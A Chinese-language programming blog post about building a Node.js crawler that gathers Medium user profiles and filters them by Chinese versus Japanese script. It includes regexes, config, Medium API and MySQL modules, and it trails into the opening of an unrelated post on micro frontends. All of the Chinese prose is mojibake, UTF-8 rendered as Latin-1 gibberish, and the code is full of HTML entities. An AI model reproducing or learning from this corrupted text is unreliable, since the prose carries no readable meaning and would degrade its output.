ç‚ºäº†é¿å…é€™å€‹æƒ…å½¢ï¼Œæˆ‘æ±ºå®šå¾è‡ªä»‹è·Ÿæš±ç¨±ä¸‹æ‰‹ï¼Œå¯«ä¸€å€‹åˆ¤æ–·è‡ªä»‹è·Ÿæš±ç¨±æ˜¯å¦å«æœ‰ä¸­æ–‡çš„å‡½å¼ï¼Œå¦‚æœæœ‰ä¸­æ–‡æ‰è¢«æ”¾é€²ä¾†ã€‚é€™é‚Šæˆ‘ç›´æ¥è¤‡è£½åœ¨ Stack Overflow ä¸Šæ‰¾åˆ°çš„ç¨‹å¼ç¢¼ï¼Œçœ‹èµ·ä¾†ååˆ†ç¥å¥‡ï¼š
function isChinese(text = &#x27;&#x27;) &#123;  // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287  const regex = /(\p&#123;Script=Hani&#125;)+/gu;  return text.match(regex)&#125;

åœ¨ queue è£¡é¢æŠ“å®Œä½¿ç”¨è€…è³‡æ–™å¾Œæœƒé€²è¡Œåˆ¤æ–·ï¼š
const info = await getUserInfo(userId)  // éä¸­æ–‡ï¼Œç›´æ¥ç•¥éif (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123;	continue;&#125;

åšé€™å€‹åˆ¤æ–·çš„æ™‚å€™æˆ‘å°±å·²ç¶“æƒ³åˆ°æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯æœ‰äº›äººä»–å€‘å–œæ­¡åœ‹éš›åŒ–ä¸€é»ï¼Œåœ¨è‡ªä»‹æœƒæ”¾å…¨è‹±æ–‡ï¼Œæš±ç¨±ä¹Ÿæœƒæ˜¯è‹±æ–‡ï¼Œæ‰€ä»¥æœƒè¢«èª¤åˆ¤ã€‚æ˜æ˜å°±æ˜¯ç”¨ä¸­æ–‡å¯«ä½œï¼Œä½†æ˜¯å»æ²’æœ‰è¢«åŠ é€² queue è£¡é¢ã€‚
é€™é‚Šæˆ‘ç•¶æ™‚è¦ºå¾—ç„¡æ‰€è¬‚ï¼Œç•¢ç«Ÿé€™æ¨£çš„äººä¸å¤šï¼Œè€Œä¸”è¦è§£çš„è©±æœ‰é»éº»ç…©ã€‚ç•¶æ™‚æˆ‘è…¦ä¸­æœ¬ä¾†å°±æœ‰æµ®ç¾ä¸€å€‹è§£æ³•ï¼Œå°±æ˜¯å»æŠ“ä»–æœ€è¿‘æ‹æ‰‹éæˆ–ç™¼è¡¨éçš„æ–‡ç« ï¼Œçœ‹çœ‹æ¨™é¡Œæ˜¯ä¸æ˜¯ä¸­æ–‡ï¼Œé€™æ¨£çš„åˆ¤æ–·æœƒæº–ç¢ºå¾ˆå¤šã€‚ä½†ç•¶æ™‚æˆ‘æ‡¶å¾—å¯¦ä½œï¼Œæƒ³èªªå…ˆè®“çˆ¬èŸ²ç¹¼çºŒè·‘ä¸€å¤©çœ‹çœ‹ã€‚
éš”å¤©æ—©ä¸Šï¼Œåˆç™¼ç¾äº†ä¸€å€‹å®Œå…¨æ²’æƒ³éæœƒç¢°åˆ°çš„å•é¡Œã€‚
ç¬¬ä¸‰ç‰ˆçˆ¬èŸ²ï¼šåˆ¤æ–·æ—¥æ–‡ä½¿ç”¨è€…æ¸…å–®è£¡é¢å‡ºç¾ä¸€å¤§å †æ—¥æœ¬äººã€‚
å› ç‚ºä»–å€‘æœ‰äº›æš±ç¨±æ˜¯æ¼¢å­—ï¼Œè¦å˜›å°±æ˜¯è‡ªä»‹æœ‰æ¼¢å­—ï¼Œæ‰€ä»¥ä¸æœƒè¢«ä¸­æ–‡åˆ¤æ–·ç¯©æ‰ã€‚ç™¼ç¾é€™å€‹å•é¡Œçš„æ™‚å€™æˆ‘ç¬¬ä¸€å€‹æƒ³æ³•æ˜¯ï¼šã€Œå¦‚æœé€™æ˜¯åœ¨é¢è©¦æˆ‘ä¸€å®šè¢«åˆ·æ‰ï¼Œé€™ç¨® case å±…ç„¶ç•¶åˆæ²’æƒ³åˆ°â€¦ã€ã€‚
ç‚ºäº†è§£æ±ºé€™ç¨®æƒ…æ³ï¼Œå°±å†æ‰¾äº†ä¸€å€‹åˆ¤æ–·æ˜¯ä¸æ˜¯æœ‰æ—¥æ–‡ï¼ˆä¸å«æ¼¢å­—ï¼‰çš„æ­£å‰‡è¡¨é”å¼ï¼š
function isJapanese(text = &#x27;&#x27;) &#123;  // @see: https://gist.github.com/ryanmcgrath/982242  const regexJP = /[\u3040-\u309F]|[\u30A0-\u30FF]/g;   const jp = text.match(regexJP)  if (jp &amp;&amp; jp.length &gt;= 3) &#123;    return true  &#125;  return false&#125;

å¦‚æœå«æœ‰ä¸‰å€‹ä»¥ä¸Šçš„æ—¥æ–‡å­—æ¯ï¼Œå°±å›å‚³æ˜¯æ—¥æ–‡ã€‚é€™é‚Šæœƒè¨­å®šæ•¸é‡æ˜¯æˆ‘æ€•æœ‰äº›å°ç£äººç”¨ä»€éº¼ ã® ä¹‹é¡çš„ï¼Œå°±æœƒè¢«èª¤åˆ¤ã€‚ä¸éé™¤äº†å¯«æ­»æ•¸é‡ä»¥å¤–ï¼Œé‚„æœ‰å€‹æ¯”è¼ƒå¥½çš„åšæ³•å¯èƒ½æ˜¯çœ‹æ¯”ä¾‹ï¼Œä¾‹å¦‚èªªä¸€å¥è©±å¦‚æœæœ‰å…«ä¹æˆæ˜¯ä¸­æ–‡å­—ï¼Œå°±æ˜¯ä¸­æ–‡ä¹‹é¡çš„ã€‚
åˆ¤æ–·é‚è¼¯çš„éƒ¨åˆ†æ”¹æˆé€™æ¨£ï¼š
const info = await getUserInfo(userId)  // éä¸­æ–‡ï¼Œç›´æ¥ç•¥éif (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123;	continue;&#125;  if (isJapanese(info.bio) || isJapanese(info.name)) &#123;    continue;&#125;

å¦‚æœä¸æ˜¯ä¸­æ–‡å°±è·³éï¼Œå†ä¾†ç¢ºèªæ˜¯ä¸æ˜¯æ—¥æ–‡ï¼Œå¦‚æœè‡ªä»‹æˆ–æ˜¯æš±ç¨±æ˜¯æ—¥æ–‡ä¹Ÿè·³éã€‚
å¥½ï¼Œé€™æ¨£å°±æ²’æœ‰å•é¡Œäº†å§ï¼æ–¼æ˜¯æˆ‘æŠŠè³‡æ–™ç å…‰ï¼Œå†è®“çˆ¬èŸ²è·‘ä¸€å€‹æ™šä¸Šè©¦è©¦çœ‹ã€‚
éš”å¤©èµ·ä¾†ï¼Œç™¼ç¾æˆ‘çœŸæ˜¯å¤©çœŸçš„å¯ä»¥ã€‚
ç¬¬å››ç‰ˆçˆ¬èŸ²ï¼šç›´æ¥é‡æ§‹æ‰“é–‹è³‡æ–™åº«ï¼Œç™¼ç¾é‚„æ˜¯æœ‰å¾ˆå¤šæ—¥æœ¬ä½¿ç”¨è€…ã€‚åŸå› åœ¨æ–¼ä»–å€‘å¯èƒ½æš±ç¨±æ˜¯ç”¨æ¼¢å­—ï¼Œç„¶å¾Œæ²’æœ‰å¯«è‡ªä»‹ï¼Œæˆ–è€…è‡ªä»‹åªæœ‰ä¸€å…©å€‹å­—ä¹‹é¡çš„ï¼Œæ‰€ä»¥é‚„æ˜¯æœƒè¢«åˆ¤å®šç‚ºæ˜¯ä¸­æ–‡ä½¿ç”¨è€…ã€‚
è¿½æ ¹ç©¶åº•ï¼Œéƒ½æ˜¯é€™å€‹åˆ¤æ–·æ©Ÿåˆ¶å¤ªä¸å¯é çš„åŸå› ã€‚
æ—¢ç„¶äº‹æƒ…å·²ç¶“åˆ°é€™å€‹åœ°æ­¥ï¼Œå°±æ²’è¾¦æ³•å·æ‡¶äº†ï¼Œæˆ‘åªèƒ½å¯¦ä½œå‰›é–‹å§‹æåˆ°çš„æ›´æº–ç¢ºçš„è§£æ³•ï¼šã€Œçœ‹çœ‹æœ€è¿‘ç™¼è¡¨éæˆ–æ˜¯æ‹æ‰‹éçš„æ–‡ç« æ˜¯ä¸æ˜¯ä¸­æ–‡ã€ï¼Œè€Œé€™éƒ¨åˆ†çš„è³‡æ–™å¹¸å¥½åŸæœ¬çš„ API å°±æœ‰æä¾›ï¼Œå¯¦ä½œèµ·ä¾†æ¯”æƒ³åƒä¸­ç°¡å–®è¨±å¤šã€‚
é™¤äº†é€™å€‹ä»¥å¤–ï¼Œç”±æ–¼ queue å¢é•·çš„é€Ÿåº¦æ¯”æ¶ˆè€—çš„é€Ÿåº¦å¿«å¤ªå¤šï¼Œå› æ­¤æˆ‘ä¸€åº¦æ”¹è®Šäº†ä¸€ä¸‹æ–¹æ³•ã€‚æˆ‘å¯«äº†å¦å¤–ä¸€æ”¯å°ç¨‹å¼ï¼ŒæŠŠåŸæœ¬æµç¨‹ä¸­çš„ã€ŒæŠŠ followers ä¸Ÿåˆ° queueã€æ‹¿æ‰ï¼Œä¸¦ä¸”ä¸€æ¬¡æ‹¿ 10 ç­†ä½¿ç”¨è€…è³‡æ–™å‡ºä¾†ã€‚
æ›å¥è©±èªªï¼Œé€™å€‹æ–°çš„å°ç¨‹å¼åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä¸æ–·æŠ“ä½¿ç”¨è€…è³‡æ–™ä¸¦å­˜åˆ°è³‡æ–™åº«ï¼Œé€™æ¨£ queue å°±æœƒä¸€ç›´è®Šå°ï¼Œè®“ä½¿ç”¨è€…è³‡æ–™æ„ˆä¾†æ„ˆå¤šã€‚å¤§æ¦‚ä¸€å€‹å°æ™‚å¯ä»¥æŠ“å…©è¬ç­†ï¼Œç´¯ç©ä¸€å€‹æ™šä¸Šçš„ queue ç™½å¤©èŠ±åŠå¤©å°±å¯ä»¥è·‘å®Œã€‚
å¥½è™•å°±æ˜¯æˆ‘å¯ä»¥å¿«é€Ÿç´¯ç©ä½¿ç”¨è€…è³‡æ–™ï¼Œç•¢ç«ŸåŸæœ¬çš„å¯¦ä½œå¤ªæ…¢äº†ï¼Œä¸€å¤©å¤§æ¦‚åªèƒ½è·‘å€‹ä¸€è¬ç­†å·¦å³ï¼Œç¾åœ¨æ–°çš„å¯¦ä½œå› ç‚ºä¸ç”¨æŠŠæ±è¥¿ä¸Ÿåˆ° queue è£¡é¢ï¼Œæœƒè®“ä½¿ç”¨è€…è³‡æ–™é•·å¾—å¾ˆå¿«ã€‚
é‚£æ™‚å€™å·æ‡¶ç›´æ¥è¤‡è£½ç¨‹å¼ç¢¼æ”¹ä¸€ä¸‹å°±åšå®Œé€™å€‹æ–°çš„å°ç¨‹å¼ï¼Œå°è‡´ç¨‹å¼å¯«åˆ°é€™é‚Šæ„ˆä¾†æ„ˆäº‚ï¼Œè€ƒé‡åˆ°ä¹‹å¾Œæƒ³è¦ open sourceï¼Œæ˜¯æ™‚å€™æ•´ç†ä¸€ä¸‹ç¨‹å¼ç¢¼äº†ï¼Œæ–¼æ˜¯å°±é †ä¾¿æŠŠç¨‹å¼é‡æ§‹ä¸€ä¸‹ã€‚
é‡æ§‹å®Œçš„æ¶æ§‹å¦‚ä¸‹ï¼š
.â”œâ”€â”€ README.md     // èªªæ˜â”œâ”€â”€ app.js        // ä¸»ç¨‹å¼â”œâ”€â”€ getUsers.js   // åªæŠ“ä½¿ç”¨è€…è³‡æ–™çš„å°ç¨‹å¼ â”œâ”€â”€ config.js     // è¨­å®šæª”â”œâ”€â”€ db.js         // è³‡æ–™åº«ç›¸é—œâ”œâ”€â”€ medium.js     // medium API ç›¸é—œâ”œâ”€â”€ package.json  â”œâ”€â”€ queue.js     â””â”€â”€ utils.js       

æˆ‘å€‘å…ˆå¾ config é–‹å§‹çœ‹èµ·å§ï¼š
module.exports = &#123;  db: &#123;    connectionLimit: 10,    host     : &#x27;&#x27;,    user     : &#x27;&#x27;,    password : &#x27;&#x27;,    database : &#x27;medium&#x27;,    charset: &#x27;utf8mb4&#x27;  &#125;,  batchLimit: 1, // ä¸€æ¬¡æŠ“å¤šå°‘ç­†ä½¿ç”¨è€…è³‡æ–™  randomDelay: function() &#123;    return Math.floor(Math.random() * 200) + 100  &#125;,  errorRateTolerance: 0.2,  delayWhenError: 500&#125;

é€™é‚Šå°±æ˜¯æ”¾ä¸€äº›è¨­å®šæª”ï¼ŒåŒ…æ‹¬è³‡æ–™åº«çš„è¨­å®šä»¥åŠä¸€äº›æŠ“è³‡æ–™çš„åƒæ•¸ï¼Œå¤§å¤šæ•¸éƒ½æ˜¯è·ŸæŠ“ä½¿ç”¨è€…è³‡æ–™çš„é‚£å€‹å°ç¨‹å¼æœ‰é—œï¼Œä¾‹å¦‚èªªè¦æŠ“å¹¾ç­†ï¼Œç„¶å¾Œæ¯ä¸€æ¬¡è¦åœå¤šä¹…ä¹‹é¡çš„ã€‚é€™äº›éƒ½æ˜¯ç‚ºäº†é¿å…é€å¤ªå¤š request è¢«æ“‹è€Œåšçš„æªæ–½ã€‚
å†ä¾†çœ‹ä¸€ä¸‹ utils.jsï¼š
module.exports = &#123;  // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287  isChinese: (text = &#x27;&#x27;) =&gt; &#123;    const regex = /(\p&#123;Script=Hani&#125;)+/gu;    return text.match(regex)  &#125;,    // @see: https://gist.github.com/ryanmcgrath/982242  isJapanese: (text = &#x27;&#x27;) =&gt; &#123;    const regexJP = /[\u3040-\u309F]|[\u30A0-\u30FF]/g;     const jp = text.match(regexJP)      // more than 2 japanese char    if (jp &amp;&amp; jp.length &gt;= 2) &#123;      return true    &#125;    return false  &#125;,    sleep: ms =&gt; new Promise(resolve =&gt; &#123;    setTimeout(resolve, ms)  &#125;),    log: function () &#123;    const args = Array.prototype.slice.call(arguments);    console.log.apply(console, args)  &#125;&#125;

é€™é‚ŠåŸºæœ¬ä¸Šå°±æ˜¯æŠŠå‰›å‰›ç”¨åˆ°çš„ä¸€äº›å‡½å¼æ¬éä¾†çµ±ä¸€æ”¾åœ¨é€™é‚Šï¼Œæ—¥æ–‡å­—æ¯çš„é™åˆ¶ç¸®å°ç‚ºå…©å€‹ï¼Œç„¶å¾ŒæŠŠ console.log åŒ…è£äº†ä¸€ä¸‹ï¼Œæƒ³èªªä¹‹å¾Œè¦å®¢è£½åŒ–æ¯”è¼ƒæ–¹ä¾¿ã€‚
ç„¶å¾Œæ˜¯ medium.jsï¼Œé€™é‚Šæ˜¯æœ‰é—œ medium API çš„éƒ¨åˆ†ï¼Œä¸¦ä¸”æ–°å¢äº†ä¸€å€‹å‡½å¼ isMandarinUser ä¾†åˆ¤æ–·æ˜¯å¦æ˜¯ä¸­æ–‡ä½¿ç”¨è€…ï¼š
const axios = require(&#x27;axios&#x27;)const _ = require(&#x27;lodash&#x27;)const utils = require(&#x27;./utils&#x27;)const JSON_HIJACKING_PREFIX = &#x27;])&#125;while(1);&lt;/x&gt;&#x27;  // wrapper function, return null instead of throwing errorasync function getMediumResponse(url) &#123;  try &#123;    const response = await axios.get(url)    const json = JSON.parse(response.data.replace(JSON_HIJACKING_PREFIX, &#x27;&#x27;))    return json  &#125; catch(err) &#123;    return null  &#125;&#125;  function isMandarinUser(name, bio, posts) &#123;    // if bio or name is japanese, must be japanese  if (utils.isJapanese(name) || utils.isJapanese(bio)) &#123;    return false  &#125;     // this user has no activity on medium, decide by name and bio  if (!posts) &#123;    return utils.isChinese(name) || utils.isChinese(bio)  &#125;    const contents = _.values(posts).map(item =&gt; item.title + _.get(item, &#x27;content.subtitle&#x27;))  return Boolean(    contents.find(item =&gt; &#123;      return utils.isChinese(item) &amp;&amp; !utils.isJapanese(item)    &#125;)  )&#125;  module.exports = &#123;  getFollowers: async (uid, to) =&gt; &#123;    let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200`    if (to) &#123;      url += &#x27;&amp;to=&#x27; + to    &#125;    const json = await getMediumResponse(url)    if (!json) &#123;      return null    &#125;    const followers = _.keys(json.payload.references.Social) || []    const nextTo = _.get(json, &#x27;payload.paging.next.to&#x27;)    return &#123;      followers,      nextTo    &#125;  &#125;,    getUserInfo: async (uid) =&gt; &#123;    const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream`    const json = await getMediumResponse(url)    if (!json) &#123;      return &#123;&#125;    &#125;    const userId = _.get(json, &#x27;payload.user.userId&#x27;)    const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0)      const posts = _.get(json, &#x27;payload.references.Post&#x27;)    const name = _.get(json, &#x27;payload.user.name&#x27;)    const bio = _.get(json, &#x27;payload.user.bio&#x27;)      return &#123;      isMandarinUser: isMandarinUser(name, bio, posts),      userId,      name,      username: _.get(json, &#x27;payload.user.username&#x27;),      bio,      followerCount: follower,      mediumMemberAt: _.get(json, &#x27;payload.user.mediumMemberAt&#x27;),      isWriterProgramEnrolled: _.get(json, &#x27;payload.user.isWriterProgramEnrolled&#x27;),      createdAt: _.get(json, &#x27;payload.user.createdAt&#x27;),    &#125;  &#125;&#125;

isMandarinUser æœƒæ ¹æ“šä¸‰å€‹åƒæ•¸ä¾†æ±ºå®šï¼šæš±ç¨±ã€è‡ªä»‹ä»¥åŠç›¸é—œæ–‡ç« ã€‚ç›¸é—œæ–‡ç« å¯èƒ½æ˜¯ä½¿ç”¨è€…æœ€è¿‘ç™¼è¡¨éçš„æˆ–è€…æ˜¯å›è¦†éèˆ‡æ‹æ‰‹éçš„æ–‡ç« ï¼Œæœƒæ ¹æ“šæ–‡ç« çš„æ¨™é¡Œä»¥åŠå‰¯æ¨™é¡Œä¾†åšåˆ¤å®šã€‚
å¦‚æœä½¿ç”¨è€…æ²’æœ‰ä»»ä½•æ´»å‹•çš„è©±ï¼Œå°±æœƒè·Ÿä¹‹å‰ä¸€æ¨£æ¡ç”¨è‡ªä»‹è·Ÿæš±ç¨±ä¾†åˆ¤å®šï¼Œæ‰€ä»¥é‚„æ˜¯æœ‰èª¤åˆ¤çš„å¯èƒ½ï¼Œä½†å¯¦æ¸¬éå¾Œèª¤åˆ¤ç‡å·²ç¶“æ»¿ä½çš„äº†ã€‚
æ¥è‘—ä¾†çœ‹èˆ‡è³‡æ–™åº«ç›¸é—œçš„æ“ä½œï¼Œdb.jsï¼š
const mysql = require(&#x27;mysql&#x27;)const moment = require(&#x27;moment&#x27;)  function format(time) &#123;  if (!time) return null  return moment(time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;  function transform(info) &#123;  return [    info.userId, info.username, info.name, info.bio, info.followerCount,    format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled, null  ]&#125;  class DB &#123;  constructor(config) &#123;    this.conn = mysql.createPool(config)  &#125;    getExistingUserIds() &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users&#x27;, (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;       return resolve(results.map(item =&gt; item.userId))      &#125;);    &#125;)  &#125;     getUserIds(limit) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users where fr=&quot;TW&quot; order by follower desc limit &#x27; + limit, (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;       return resolve(results.map(item =&gt; item.userId))      &#125;);    &#125;)  &#125;     deleteUserIds(userIds) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;DELETE from Queues WHERE userId IN (?)&#x27;, [userIds], (err, results) =&gt; &#123;        if (err) &#123;          return reject(err)        &#125;        return resolve(userIds)      &#125;)    &#125;)  &#125;    insertUserData(info) &#123;    if (!info) return    const data = Array.isArray(info) ? info.map(transform) : [transform(info)]    this.conn.query(`      INSERT INTO Users      (        userId, username, name, bio, follower,        mediumMemberAt, createdAt, isWriterProgramEnrolled, fr      ) VALUES ?`, [data], (err) =&gt; &#123;        if (err) &#123;          // console.log(err)        &#125;      &#125;    )  &#125;    insertIntoQueue(list) &#123;    return new Promise((resolve, reject) =&gt; &#123;      const values = []      for (let item of list) &#123;        values.push([item])      &#125;      this.conn.query(`        INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123;          if (err) &#123;            // console.log(err)          &#125;          resolve()        &#125;      )    &#125;)  &#125;&#125;  module.exports = DB

åŸºæœ¬ä¸Šå°±æ˜¯æŠŠä¸€å¤§å † SQL query åŒ…è£æˆ Promise ä»¥åŠ functionï¼Œæ–¹ä¾¿å…¶ä»–çš„ module ä¾†ä½¿ç”¨ã€‚å¤§éƒ¨åˆ†çš„å‡½å¼éƒ½èƒ½å¤ æ¥æ”¶ä¸€å€‹ array ä¾†åšæ‰¹æ¬¡æ“ä½œï¼Œé€™æ¨£æœƒæ›´æœ‰æ•ˆç‡ä¸€é»ã€‚
è€Œä¸”æŠŠé€™äº›æ±è¥¿åŒ…è£èµ·ä¾†ä¹‹å¾Œï¼Œqueue çš„ç¨‹å¼ç¢¼å°±æœƒè®Šå¾—éå¸¸å–®ç´”ï¼š
class Queue &#123;  constructor(db) &#123;    this.db = db  &#125;    async get(limit) &#123;    const items = await this.db.getUserIds(limit)    await this.db.deleteUserIds(items)    return items  &#125;    async push(list) &#123;    await this.db.insertIntoQueue(list)  &#125;&#125;  module.exports = Queue

æœ€å¾Œä¾†çœ‹ä¸€ä¸‹æˆ‘å€‘çš„ä¸»ç¨‹å¼ app.jsï¼Œåœ¨é‡æ§‹ä¹‹å¾Œç¨‹å¼ç¢¼è®Šå¾—ä¹¾æ·¨å¾ˆå¤šï¼Œå¯è®€æ€§ä¹Ÿææ˜‡äº†ä¸å°‘ï¼š
const DB = require(&#x27;./db&#x27;)const Queue = require(&#x27;./queue&#x27;)const config = require(&#x27;./config&#x27;)const medium = require(&#x27;./medium&#x27;)const utils = require(&#x27;./utils&#x27;)  async function main() &#123;  const db = new DB(config.db)  const queue = new Queue(db)  const existingUserIds = await db.getExistingUserIds()  const userIdMap = &#123;&#125;  for (let userId of existingUserIds) &#123;    userIdMap[userId] = true  &#125;    utils.log(&#x27;Existing userId:&#x27;, existingUserIds.length)    while(true) &#123;    const userIds = await queue.get(1)    if (userIds.length === 0) &#123;      utils.log(&#x27;Done&#x27;)      break    &#125;      const userId = userIds[0]    if (userIdMap[userId]) &#123;      continue    &#125;    userIdMap[userId] = true    utils.log(&#x27;userId:&#x27;, userId)      try &#123;      const userInfo = await medium.getUserInfo(userId)        if (!userInfo.userId) &#123;        utils.log(&#x27;getUerrInfo error, sleep for&#x27;, config.delayWhenError)        await utils.sleep(config.delayWhenError)      &#125;        if (!userInfo.isMandarinUser) &#123;        utils.log(userId, &#x27;not MandarinUser&#x27;)        continue      &#125;        db.insertUserData(userInfo)        if (userInfo.followerCount &gt; 0) &#123;        let to = undefined        let count = 0        while (true) &#123;          const data = await medium.getFollowers(userInfo.userId, to)          if (!data) &#123;            break          &#125;          const &#123; nextTo, followers &#125; = data          to = nextTo          count += followers.length          utils.log(userInfo.userId, &#x27;fetching&#x27;, count, &#x27;followers&#x27;)          await queue.push(followers.filter(uid =&gt; !userIdMap[uid]))          if (followers.length === 0 || !to) &#123;            break          &#125;        &#125;      &#125;    &#125; catch (err) &#123;      utils.log(&#x27;sleep for&#x27;, config.delayWhenError)      utils.log(err)      await utils.sleep(config.delayWhenError)    &#125;  &#125;  process.exit()&#125;  main()

é€™é‚Šæœ‰å€‹æ©Ÿåˆ¶èˆ‡ä¹‹å‰ä¸ä¸€æ¨£ï¼Œä¹‹å‰æ˜¯æ¯æ¬¡å¾ queue æ‹¿ä¸€å€‹ userId å‡ºä¾†å°±å»è³‡æ–™åº«ç¢ºèªä¸€ä¸‹æ˜¯å¦çˆ¬éï¼Œä½†æ˜¯é€™æ¨£å¤ªæ²’æœ‰æ•ˆç‡ã€‚åœ¨é€™å€‹ç‰ˆæœ¬æ”¹æˆç¨‹å¼åŸ·è¡Œæ™‚å°±ç›´æ¥å¾è³‡æ–™åº«è£¡é¢æŠŠæ‰€æœ‰è³‡æ–™æ‹¿å‡ºä¾†ï¼Œä¸¦ä¸”è®Šæˆä¸€å€‹ mapï¼Œå¦‚æœæœ‰å€¼çš„è©±å°±ä»£è¡¨å·²ç¶“æŠ“å–éï¼Œåä¹‹äº¦ç„¶ã€‚
é‡æ§‹éçš„ç¨‹å¼ç¢¼æŠŠ module åˆ‡é–‹ä¹‹å¾Œçœ‹èµ·ä¾†é †çœ¼å¾ˆå¤šï¼Œè€Œä¸”è¦æ”¹ä»€éº¼éƒ½å¾ˆå®¹æ˜“ï¼Œæ²’æœ‰é‡æ§‹éçš„è©±æˆ‘é‚„çœŸä¸æ•¢ open source å‡ºå»â€¦
é€™é‚Šæ˜¯é‡æ§‹å®Œçš„ç¨‹å¼ç¢¼ï¼šhttps://github.com/aszx87410/medium-user-crawler
ç¸½çµåœ¨å¯«çˆ¬èŸ²çš„éç¨‹ä¸­ä¹Ÿæ˜¯è¸©äº†æ»¿å¤šå‘çš„ï¼Œå…¶ä¸­æœ€éº»ç…©çš„å°±æ˜¯èªè¨€åˆ¤æ–·é‚£ä¸€å¡Šï¼Œç•¶åˆæ²’æœ‰æƒ³åˆ°æ—¥æ–‡æ¼¢å­—é€™å€‹ case è¦åˆ¤æ–·ï¼ŒèŠ±äº†ä¸å°‘æ™‚é–“ã€‚å·æ‡¶ä¹ŸèŠ±äº†å¾ˆå¤šæ™‚é–“ï¼ŒåŸæœ¬å·æ‡¶ä¸æƒ³ç”¨æ›´ç²¾ç¢ºçš„æ–¹æ³•ä¾†åšåˆ¤å®šï¼Œæ²’æƒ³åˆ°æœ€å¾Œé‚„æ˜¯å¾—ç”¨ï¼Œä¸­é–“æµªè²»äº†ä¸å°‘æ™‚é–“ã€‚
é€™çˆ¬èŸ²é‚„æœ‰æ»¿å¤šåœ°æ–¹å¯ä»¥æ”¹é€²çš„ï¼Œä¾‹å¦‚èªªåŸ·è¡Œé€Ÿåº¦çš„éƒ¨åˆ†ï¼Œæˆ–è€…æ˜¯åˆ¤å®šèªè¨€çš„éƒ¨åˆ†ï¼Œç›®å‰æ˜¯æˆ‘æŠŠè³‡æ–™æ’ˆå‡ºä¾†ä¹‹å¾Œæ‰‹å‹•æ¨™æ˜¯é¦™æ¸¯ã€å°ç£é‚„æ˜¯ä¸­åœ‹ï¼Œä½†æˆ–è¨±å¯ä»¥å¯«ä¸€äº›å°ç¨‹å¼ä¾†è‡ªå‹•åˆ¤å®šï¼Œä¾‹å¦‚èªªç°¡é«”å°±æ˜¯ä¸­åœ‹ï¼Œæœ‰å‡ºç¾ä¸€äº›ç²µèªçš„å­—å°±æ˜¯é¦™æ¸¯ï¼Œåä¹‹å‰‡æ˜¯å°ç£ç­‰ç­‰ï¼Œé›–ç„¶ä¸ä¸€å®šæº–ç¢ºï¼Œä½†è‡³å°‘ç”¨ç¨‹å¼ä¾†è¼”åŠ©æœƒæ–¹ä¾¿å¾ˆå¤šã€‚
é€™ç¯‡ä¸»è¦æ˜¯åˆ†äº«ä¸€ä¸‹æˆ‘å¯«é€™å€‹çˆ¬èŸ²çš„æ­·ç¨‹ï¼Œå…¶å¯¦åªè¦è³‡æ–™ä¾†æºèƒ½ç¢ºå®šæŠ“å¾—åˆ°ï¼Œå…¶ä»–éƒ½ä¸æ˜¯ä»€éº¼å¤§å•é¡Œã€‚å†åŠ ä¸Šé€™å€‹çˆ¬èŸ²æ²’æœ‰å¾ˆå®Œæ•´ï¼ˆä¾‹å¦‚èªªæ²’æœ‰ retry æ©Ÿåˆ¶ï¼‰ï¼Œæ‰€ä»¥èŠ±å€‹ä¸€å…©å¤©å°±èƒ½å¤ å¯¦ä½œå®Œæˆäº†ã€‚
å¸Œæœ›é€™ç¯‡æœ‰å¸å¼•åˆ°å¤§å®¶ï¼Œä¹Ÿå¾ˆå¸Œæœ›å¤§å®¶èƒ½è©¦è©¦çœ‹è‡ªå·±çˆ¬è³‡æ–™ï¼Œåšå‡ºæœ‰è¶£çš„æ•¸æ“šåˆ†æï¼
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>medium</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·æ¢è¨ Micro Frontends çš„ä¸–ç•Œ</title>
    <url>/2019/01/12/micro-frontends-concept/</url>
    <content><![CDATA[å‰è¨€å¤§æ¦‚ä¸‰å€‹æœˆå‰ï¼Œå¿˜äº†åœ¨å“ªçœ‹åˆ° Micro Frontends é€™å€‹è©ï¼Œç•¶æ™‚æ²’æœ‰ä»”ç´°å»äº†è§£ï¼ˆç•¢ç«Ÿè½èµ·ä¾†å°±åƒæ˜¯å¦ä¸€å€‹ Buzzword XDï¼‰ï¼Œåªæ˜¯å¾åå­—å¤§æ¦‚çŒœæ¸¬æ˜¯æƒ³è®“å‰ç«¯é é¢æ›´åŠ æ¨¡çµ„åŒ–ï¼Œè®“ä¸åŒåœ˜éšŠèƒ½æ›´æœ‰æ•ˆç‡çš„é–‹ç™¼å…±åŒçš„ç«™ã€‚ç¨å¾® Google äº†ä¸€ä¸‹é€™å€‹ termï¼Œç™¼ç¾æ–‡ç« å¤šæ•¸åœ¨ 2018 çš„äº”å…­æœˆå‡ºç¾ï¼Œä¹‹å¾Œå°±é®®å°‘äººæèµ·ï¼Œæˆ‘ä¹Ÿå°±æ·¡å¿˜äº†ä»–ã€‚
